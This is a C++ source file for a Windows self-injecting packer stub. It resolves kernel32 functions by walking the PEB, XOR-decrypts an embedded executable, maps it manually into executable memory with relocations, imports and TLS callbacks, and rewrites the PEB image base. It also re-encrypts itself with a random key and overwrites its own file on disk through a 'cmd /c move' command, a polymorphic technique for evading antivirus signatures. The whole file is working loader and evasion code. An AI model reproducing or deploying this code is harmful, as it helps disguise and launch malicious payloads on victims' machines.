#include <windows.h>
#include <intrin.h>
#include "xorkey.hpp"


#define RELOC_FLAG(RelInfo) ((RelInfo >> 0x0C) == 10)
#define FIELD_OFFSET(type, field)    ((INT32)(INT64)&(((type *)0)->field))
#define UFIELD_OFFSET(type, field)    ((UINT32)(INT64)&(((type *)0)->field))
#define IMAGE_FIRST_SECTION( ntheader ) ((PIMAGE_SECTION_HEADER)        \
    ((UINT64)(ntheader) +                                            \
     FIELD_OFFSET( IMAGE_NT_HEADERS64, OptionalHeader ) +                 \
     ((ntheader))->FileHeader.SizeOfOptionalHeader   \
    ))

using namespace std;

//#define INLINE_STATE __declspec(noinline)
#define INLINE_STATE __forceinline

typedef struct _UNICODE_STRING {
	WORD Length;
	WORD MaximumLength;
	WCHAR* Buffer;
} UNICODE_STRING;


typedef ULONG64(__stdcall* f_LoadLibraryA)(const char* lpLibFilename);
typedef ULONG64(__stdcall* f_GetProcAddress)(ULONG64 hModule, const char* lpProcName);
typedef ULONG64(__stdcall* f_VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef ULONG64(__stdcall* f_GetSystemTimeAsFileTime)(LPFILETIME ft);
typedef HANDLE(__stdcall* f_CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef BOOL(__stdcall* f_WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
typedef BOOL(__stdcall* f_CloseHandle)(HANDLE handle);
typedef BOOL(__stdcall* f_CreateProcessW)(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
typedef ULONG64(__fastcall* f_Entry)(ULONG64 rcx, ULONG64 rdx, ULONG64 r8, ULONG64 r9);

INLINE_STATE void CopyMem(BYTE* to, BYTE* from, DWORD size);
INLINE_STATE bool checkTimeStamp(BYTE* my_pe, f_GetSystemTimeAsFileTime _GetSystemTimeAsFileTime);
INLINE_STATE void modPEB(BYTE* address);
INLINE_STATE void getK32Functions(f_LoadLibraryA* LLA, f_GetProcAddress* GPA, f_VirtualAlloc* VA, f_GetSystemTimeAsFileTime* GST, f_CreateFileW* CFW, f_WriteFile* WF, f_CloseHandle* CH, f_CreateProcessW* CPW);
INLINE_STATE BYTE* getMyBase();
INLINE_STATE BYTE* decryptPe(BYTE* mype);
INLINE_STATE BYTE* initPe(f_VirtualAlloc _VirtualAlloc, BYTE* pe);
INLINE_STATE f_Entry loadImports(f_LoadLibraryA _LoadLibraryA, f_GetProcAddress _GetProcAddress, PVOID pData);
INLINE_STATE ULONG64 msSinceEpoch(f_GetSystemTimeAsFileTime _GetSystemTimeAsFileTime);
INLINE_STATE UNICODE_STRING* getImagePathName();
INLINE_STATE UNICODE_STRING* getCommandLine();
INLINE_STATE WCHAR* getTargetFileName(f_VirtualAlloc _VirtualAlloc, DWORD* tlen);
INLINE_STATE BYTE* repackPe(BYTE* pe, ULONG64* rps, f_VirtualAlloc _VirtualAlloc);
INLINE_STATE void changeEncryption(BYTE* packedpe, f_GetSystemTimeAsFileTime _GetSystemTimeAsFileTime);
INLINE_STATE bool isLLA(char* name);
INLINE_STATE bool isGPA(char* name);
INLINE_STATE bool isVA(char* name);
INLINE_STATE bool isGST(char* name);
INLINE_STATE bool isWF(char* name);
INLINE_STATE bool isCFW(char* name);
INLINE_STATE bool isCH(char* name);
INLINE_STATE bool isCPW(char* name);
INLINE_STATE void xchgAndEx(UNICODE_STRING* realname, WCHAR* copyname, DWORD len, UNICODE_STRING* cline, f_VirtualAlloc _VirtualAlloc, f_CreateProcessW _CreateProcessW);
INLINE_STATE bool EzWriteFile(WCHAR* name, BYTE* data, ULONG64 size, f_CreateFileW _CreateFileW, f_WriteFile _WriteFile, f_CloseHandle _CloseHandle);

__declspec(noinline) ULONG64 __fastcall selfInject(ULONG64 rcx, ULONG64 rdx, ULONG64 r8, ULONG64 r9) {
	f_LoadLibraryA  _LoadLibraryA = 0;
	f_GetProcAddress _GetProcAddress = 0;
	f_VirtualAlloc _VirtualAlloc = 0;
	f_GetSystemTimeAsFileTime _GetSystemTimeAsFileTime = 0;
	f_CreateFileW _CreateFileW = 0;
	f_WriteFile _WriteFile = 0;
	f_CloseHandle _CloseHandle = 0;
	f_CreateProcessW _CreateProcessW = 0;
	getK32Functions(&_LoadLibraryA, &_GetProcAddress, &_VirtualAlloc, &_GetSystemTimeAsFileTime, &_CreateFileW, &_WriteFile, &_CloseHandle, &_CreateProcessW);

	BYTE* my_pe = getMyBase();
	BYTE* decrypted_pe = decryptPe(my_pe);
	if (checkTimeStamp(my_pe, _GetSystemTimeAsFileTime)) {
		ULONG64 repacked_size = 0;
		BYTE* repacked_pe = repackPe(my_pe, &repacked_size, _VirtualAlloc);
		changeEncryption(repacked_pe, _GetSystemTimeAsFileTime);

		UNICODE_STRING* realname = getImagePathName();
		UNICODE_STRING* cline = getCommandLine();
		DWORD tlen = 0;
		WCHAR* tname = getTargetFileName(_VirtualAlloc, &tlen);

		EzWriteFile(tname, repacked_pe, repacked_size, _CreateFileW, _WriteFile, _CloseHandle);

		xchgAndEx(realname, tname, tlen, cline, _VirtualAlloc, _CreateProcessW);
		__fastfail(0);
	} else {
		BYTE* new_pe = initPe(_VirtualAlloc, decrypted_pe);
		modPEB(new_pe);
		f_Entry _Main = loadImports(_LoadLibraryA, _GetProcAddress, new_pe);
		return _Main(rcx, rdx, r8, r9);
	}
}

INLINE_STATE void xchgAndEx(UNICODE_STRING* realname, WCHAR* copyname, DWORD len, UNICODE_STRING* cline, f_VirtualAlloc _VirtualAlloc, f_CreateProcessW _CreateProcessW) {
	//cmd /c "move /y copyname.exe realname.exe > NUL 2>&1 &&cline.exe"
	//commandline
	//             >cmd /c "move /y <  > <              > > NUL 2>&1 < >&&<           >"<       
	ULONG64 requiredSize = 32 + len +  2 + realname->Length + 24 + 4 + cline->Length + 4; //Null terminator
	BYTE* command = (BYTE*)_VirtualAlloc(0, requiredSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); //THIS IS A WCHAR STRING!!

	ULONG64 currentOffset = 0;
	((ULONG64*)command)[0] = *(ULONG64*)L"cmd ";
	((ULONG64*)command)[1] = *(ULONG64*)L"/c \"";
	((ULONG64*)command)[2] = *(ULONG64*)L"move";
	((ULONG64*)command)[3] = *(ULONG64*)L" /y ";
	currentOffset += 32;
	CopyMem(command + currentOffset, (BYTE*)copyname, len);
	currentOffset += len;
	((WORD*)(command + currentOffset))[0] = *(WORD*)L" ";
	currentOffset += 2;
	CopyMem(command + currentOffset, (BYTE*)realname->Buffer, realname->Length);
	currentOffset += realname->Length;
	*(ULONG64*)(&command[currentOffset]) = *(ULONG64*)L" > N";
	currentOffset += 8;
	*(ULONG64*)(&command[currentOffset]) = *(ULONG64*)L"UL 2";
	currentOffset += 8;
	*(ULONG64*)(&command[currentOffset]) = *(ULONG64*)L">&1 ";
	currentOffset += 8;
	((DWORD*)(command + currentOffset))[0] = *(DWORD*)L"&&";
	currentOffset += 4;
	CopyMem(command + currentOffset, (BYTE*)cline->Buffer, cline->Length);
	currentOffset += cline->Length;
	((WORD*)(command + currentOffset))[0] = *(WORD*)L"\"";
	currentOffset += 2;

	LPCWSTR lpApplicationName = 0;
	LPWSTR lpCommandLine = (LPWSTR)command;
	STARTUPINFOW trash1 = { sizeof(STARTUPINFOW) };
	PROCESS_INFORMATION trash2;
	_CreateProcessW(lpApplicationName, lpCommandLine, 0, 0, false, 0, 0, 0, &trash1, &trash2);
}

INLINE_STATE void changeEncryption(BYTE* packedpe, f_GetSystemTimeAsFileTime _GetSystemTimeAsFileTime) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)packedpe;
	PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(packedpe + dosHeader->e_lfanew);
	IMAGE_SECTION_HEADER* firstSec = IMAGE_FIRST_SECTION(ntHeaders);
	BYTE* datasec = packedpe + firstSec->PointerToRawData;
	XORKEY* key = (XORKEY*)datasec;
	BYTE* dataBegin = datasec + key->len + 8;
	for (WORD x = 0; x < key->len; x++) { //Change key
		unsigned __int64 val = 0;
		_rdrand64_step(&val);
		key->key[x] = (val % 0xff) + 1;
	}
	for (ULONG64 x = 0; x < key->data_len; x++) {
		dataBegin[x] ^= key->key[x % key->len];
	}
	ntHeaders->FileHeader.TimeDateStamp = (DWORD)msSinceEpoch(_GetSystemTimeAsFileTime);
}

INLINE_STATE bool EzWriteFile(WCHAR* name, BYTE* data, ULONG64 size, f_CreateFileW _CreateFileW, f_WriteFile _WriteFile, f_CloseHandle _CloseHandle) {
	HANDLE hFile = _CreateFileW(name, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);

	if (hFile == INVALID_HANDLE_VALUE) {
		__debugbreak();
		return false;
	}

	DWORD bytesWritten;
	BOOL success = _WriteFile(hFile, data, size, &bytesWritten, nullptr);

	if (!success) {
		__debugbreak();
		return false;
	}

	_CloseHandle(hFile);
	return true;
}


INLINE_STATE BYTE* repackPe(BYTE* my_pe, ULONG64* rps, f_VirtualAlloc _VirtualAlloc) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)my_pe;
	PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(my_pe + dosHeader->e_lfanew);
	
	IMAGE_SECTION_HEADER* firstSec = IMAGE_FIRST_SECTION(ntHeaders);
	IMAGE_SECTION_HEADER* secondSec = firstSec + 1;

	ULONG64 packedSize = ntHeaders->OptionalHeader.SizeOfHeaders + firstSec->SizeOfRawData + secondSec->SizeOfRawData;
	
	BYTE* repacked = (BYTE*)_VirtualAlloc(0, packedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	CopyMem(repacked, my_pe, ntHeaders->OptionalHeader.SizeOfHeaders);
	CopyMem(repacked + ntHeaders->OptionalHeader.SizeOfHeaders, my_pe + firstSec->VirtualAddress, firstSec->SizeOfRawData);
	CopyMem(repacked + ntHeaders->OptionalHeader.SizeOfHeaders + firstSec->SizeOfRawData, my_pe + secondSec->VirtualAddress, secondSec->SizeOfRawData);

	*rps = packedSize;
	return repacked;
}

INLINE_STATE bool checkTimeStamp(BYTE* my_pe, f_GetSystemTimeAsFileTime _GetSystemTimeAsFileTime) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)my_pe;
	PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(my_pe + dosHeader->e_lfanew);

	DWORD now = (DWORD)msSinceEpoch(_GetSystemTimeAsFileTime);
	DWORD fileTime = ntHeaders->FileHeader.TimeDateStamp;
	return now - fileTime > 15000; //if the last time we were modified was 15s+ ago
}

INLINE_STATE WCHAR* getTargetFileName(f_VirtualAlloc _VirtualAlloc, DWORD* tlen) {
	UNICODE_STRING* ImagePathName = getImagePathName();
	//One extra wchar for L'0' and one wchar as null terminator
	BYTE* alloc = (BYTE*)_VirtualAlloc(0, ImagePathName->Length + 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!alloc)
	{
		__fastfail(5);
	}
	CopyMem(alloc, (BYTE*)ImagePathName->Buffer, ImagePathName->Length);
	*(WCHAR*)(alloc + ImagePathName->Length) = L'0';
	*tlen = ImagePathName->Length + 2;
	return (WCHAR*)alloc;
}

INLINE_STATE UNICODE_STRING* getImagePathName() {
	ULONG64 peb = __readgsqword(0x60);
	ULONG64 rtl_user_process_params = *(ULONG64*)(peb + 0x20);
	UNICODE_STRING* ImagePathName = (UNICODE_STRING*)(rtl_user_process_params + 0x60);
	return ImagePathName;
}

INLINE_STATE UNICODE_STRING* getCommandLine() {
	ULONG64 peb = __readgsqword(0x60);
	ULONG64 rtl_user_process_params = *(ULONG64*)(peb + 0x20);
	UNICODE_STRING* ImagePathName = (UNICODE_STRING*)(rtl_user_process_params + 0x70);
	return ImagePathName;
}

INLINE_STATE ULONG64 msSinceEpoch(f_GetSystemTimeAsFileTime _GetSystemTimeAsFileTime) {
	FILETIME ft;
	_GetSystemTimeAsFileTime(&ft);
	ULARGE_INTEGER uli;
	uli.LowPart = ft.dwLowDateTime;
	uli.HighPart = ft.dwHighDateTime;
	ULONGLONG msSince1601 = uli.QuadPart / 10000ULL;
	ULONGLONG msSince1970 = msSince1601 - 11644473600000ULL;

	return msSince1970;
}

INLINE_STATE void modPEB(BYTE* address) {
	BYTE** peb = (BYTE**)__readgsqword(0x60);
	peb[2] = address;
}
INLINE_STATE void CopyMem(BYTE* to, BYTE* from, DWORD size) {
	for (DWORD i = 0; i < size; i++) {
		to[i] = from[i];
	}
}

INLINE_STATE bool isLLA(char* name) { //LoadLibraryA
	ULONG64 first = *(ULONG64*)"LoadLibr";
	return *(ULONG64*)name == first && name[11] == 'A';
}

INLINE_STATE bool isGPA(char* name) { //GetProcAddress
	ULONG64 first = *(ULONG64*)"GetProcA";
	return *(ULONG64*)name == first;
}

INLINE_STATE bool isVA(char* name) { //VirtualAlloc
	ULONG64 first = *(ULONG64*)"VirtualA";
	return *(ULONG64*)name == first && name[12] == 0;
}

INLINE_STATE bool isGST(char* name) { //GetSystemTimeAsFileTime
	ULONG64 first = *(ULONG64*)"GetSyste";
	ULONG64 second = *(ULONG64*)"mTimeAsF";
	return *(ULONG64*)name == first && ((ULONG64*)name)[1] == second;
}

INLINE_STATE bool isWF(char* name) { //WriteFile
	ULONG64 first = *(ULONG64*)"WriteFil";
	WORD second = *(WORD*)"e\x00";
	return *(ULONG64*)name == first && ((WORD*)name)[4] == second;
}

INLINE_STATE bool isCFW(char* name) { //CreateFileW
	ULONG64 first = *(ULONG64*)"CreateFi";
	DWORD second = *(DWORD*)"leW\x00";
	return *(ULONG64*)name == first && ((DWORD*)name)[2] == second;
}

INLINE_STATE bool isCH(char* name) { //CloseHandle
	ULONG64 first = *(ULONG64*)"CloseHan";
	return *(ULONG64*)name == first;
}

INLINE_STATE bool isCPW(char* name) { //CreateProcessW
	ULONG64 first = *(ULONG64*)"CreatePr";
	WORD second = *(WORD*)"W\x00";
	return *(ULONG64*)name == first && *(WORD*)(name + 13) == second;
}

INLINE_STATE void getK32Functions(f_LoadLibraryA* LLA, f_GetProcAddress* GPA, f_VirtualAlloc* VA, f_GetSystemTimeAsFileTime* GST, f_CreateFileW* CFW, f_WriteFile* WF, f_CloseHandle* CH, f_CreateProcessW* CPW) {
	ULONG64***** peb = (ULONG64*****)__readgsqword(0x60);
	ULONG64**** data = peb[3];
	ULONG64*** entry1 = data[2];
	ULONG64** entry2 = *entry1;
	ULONG64* entry3 = *entry2;
	ULONG64 k32base = entry3[6];

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)k32base;
	PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(k32base + dosHeader->e_lfanew);
	UINT32 exportsRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(k32base + exportsRva);
	UINT32* nameRva = (UINT32*)(k32base + exports->AddressOfNames);



	for (UINT32 i = 0; i < exports->NumberOfNames; ++i)
	{
		char* func = (char*)(k32base + nameRva[i]);
		UINT32* funcRva = (UINT32*)(k32base + exports->AddressOfFunctions);
		UINT16* ordinalRva = (UINT16*)(k32base + exports->AddressOfNameOrdinals);

		UINT16 ordinalDref = ordinalRva[i];
		UINT32 funcDref = funcRva[ordinalDref];

		if (isLLA(func)) {
			*LLA = (f_LoadLibraryA)(k32base + funcDref);
		} else if (isGPA(func)) {
			*GPA = (f_GetProcAddress)(k32base + funcDref);
		} else if (isVA(func)) {
			*VA = (f_VirtualAlloc)(k32base + funcDref);
		} else if (isGST(func)) {
			*GST = (f_GetSystemTimeAsFileTime)(k32base + funcDref);
		} else if (isWF(func)) {
			*WF = (f_WriteFile)(k32base + funcDref);
		} else if (isCFW(func)) {
			*CFW = (f_CreateFileW)(k32base + funcDref);
		} else if (isCH(func)) {
			*CH = (f_CloseHandle)(k32base + funcDref);
		} else if (isCPW(func)) {
			*CPW = (f_CreateProcessW)(k32base + funcDref);
		}
	}
}

INLINE_STATE BYTE* getMyBase() {
	return ((BYTE**)__readgsqword(0x60))[2];
}

INLINE_STATE BYTE* decryptPe(BYTE* mype) {
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)mype;
	PIMAGE_NT_HEADERS64 nt_header = (PIMAGE_NT_HEADERS64)(mype + dos_header->e_lfanew);
	IMAGE_SECTION_HEADER* pSectionHeader = IMAGE_FIRST_SECTION(nt_header);
	BYTE* datasec = mype + pSectionHeader[0].VirtualAddress;
	XORKEY* xk = (XORKEY*)datasec;
	BYTE* base = datasec + 8 + xk->len;
	for (ULONG64 i = 0; i < xk->data_len; i++) {
		base[i] ^= xk->key[i % xk->len];
	}
	return base;
}

INLINE_STATE BYTE* initPe(f_VirtualAlloc _VirtualAlloc, BYTE* pe) {
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)pe;
	PIMAGE_NT_HEADERS64 nt_header = (PIMAGE_NT_HEADERS64)(pe + dos_header->e_lfanew);
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(nt_header);

	BYTE* newpe = (BYTE*)(_VirtualAlloc(0, nt_header->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));

	if (!newpe)
	{
		__fastfail(5);
	}

	CopyMem(newpe, pe, nt_header->OptionalHeader.SizeOfHeaders);

	for (UINT i = 0; i != nt_header->FileHeader.NumberOfSections; ++i, ++pSectionHeader)
	{
		if (pSectionHeader->SizeOfRawData)
		{
			CopyMem(newpe + pSectionHeader->VirtualAddress, pe + pSectionHeader->PointerToRawData, pSectionHeader->SizeOfRawData);
		}
	}

	return newpe;
}

INLINE_STATE f_Entry  loadImports(f_LoadLibraryA _LoadLibraryA, f_GetProcAddress _GetProcAddress, PVOID pData)
{
	BYTE* pBase = (BYTE*)pData;
	IMAGE_OPTIONAL_HEADER* pOptionalHeader = &((IMAGE_NT_HEADERS*)(pBase + ((IMAGE_DOS_HEADER*)pData)->e_lfanew))->OptionalHeader;
	f_Entry _Main = (f_Entry)(pBase + pOptionalHeader->AddressOfEntryPoint);

	BYTE* LocationDelta = pBase - pOptionalHeader->ImageBase;
	if (LocationDelta)
	{
		if (pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {

			IMAGE_BASE_RELOCATION* pRelocData = (IMAGE_BASE_RELOCATION*)(pBase + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
			while (pRelocData->VirtualAddress)
			{
				UINT AmountOfEntries = (pRelocData->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
				WORD* pRelativeInfo = (WORD*)(pRelocData + 1);

				for (UINT i = 0; i != AmountOfEntries; ++i, ++pRelativeInfo)
				{
					if (RELOC_FLAG(*pRelativeInfo))
					{
						ULONG64* pPatch = (ULONG64*)(pBase + pRelocData->VirtualAddress + ((*pRelativeInfo) & 0xFFF));
						*pPatch += (ULONG64)(LocationDelta);
					}
				}
				pRelocData = (IMAGE_BASE_RELOCATION*)((BYTE*)(pRelocData)+pRelocData->SizeOfBlock);
			}
		}
	}
	if (pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size)
	{
		IMAGE_IMPORT_DESCRIPTOR* pImportDescr = (IMAGE_IMPORT_DESCRIPTOR*)(pBase + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
		while (pImportDescr->Name)
		{
			char* szMod = (char*)(pBase + pImportDescr->Name);
			PVOID hDll = (PVOID)_LoadLibraryA(szMod);

			ULONG64* pThunkRef = (ULONG64*)(pBase + pImportDescr->OriginalFirstThunk);
			ULONG64* pFuncRef = (ULONG64*)(pBase + pImportDescr->FirstThunk);

			if (!pThunkRef)
				pThunkRef = pFuncRef;

			for (; *pThunkRef; ++pThunkRef, ++pFuncRef)
			{
				if (IMAGE_SNAP_BY_ORDINAL(*pThunkRef))
				{
					*pFuncRef = (ULONG64)_GetProcAddress((ULONG64)hDll, (char*)(*pThunkRef & 0xFFFF));
				} else
				{
					IMAGE_IMPORT_BY_NAME* pImport = (IMAGE_IMPORT_BY_NAME*)(pBase + (*pThunkRef));
					*pFuncRef = _GetProcAddress((ULONG64)hDll, pImport->Name);
				}
			}
			++pImportDescr;
		}
	}
	if (pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size)
	{
		IMAGE_TLS_DIRECTORY* pTLS = (IMAGE_TLS_DIRECTORY*)(pBase + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
		PIMAGE_TLS_CALLBACK* pCallback = (PIMAGE_TLS_CALLBACK*)(pTLS->AddressOfCallBacks);
		for (; pCallback && *pCallback; ++pCallback)
			(*pCallback)(pBase, DLL_PROCESS_ATTACH, 0);
	}
	return _Main;
}



__declspec(noinline) int selfInjectEnd() {
	return 123;
}